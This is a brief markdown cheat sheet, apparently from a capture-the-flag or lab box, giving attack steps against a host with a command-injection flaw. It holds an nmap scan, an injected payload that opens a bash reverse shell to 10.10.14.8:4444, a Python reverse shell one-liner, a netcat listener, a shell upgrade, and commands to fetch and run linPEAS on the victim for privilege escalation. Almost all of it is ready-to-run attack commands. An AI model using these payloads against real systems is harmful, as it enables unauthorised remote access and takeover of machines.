### Basic Command Injection

**1. Port Scan**

```bash
 sudo nmap -sS -sV -sC --top-ports 100 ip_address -oA ip_address
 ```
 
 2. Command Injection

```bash
# victim machine
8.8.8.8; bash -c 'exec bash -i &>/dev/tcp/10.10.14.8/4444 <&1'

or

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# attacker machine
nc -nlvp 4444

# upgrade to interctive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

```

3. Privellege Escalation

```bash
# https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

# attacker machine
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh

python -m SimpleHTTPServer 5555

# victim machine
wget http://10.10.14.8:5555/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh



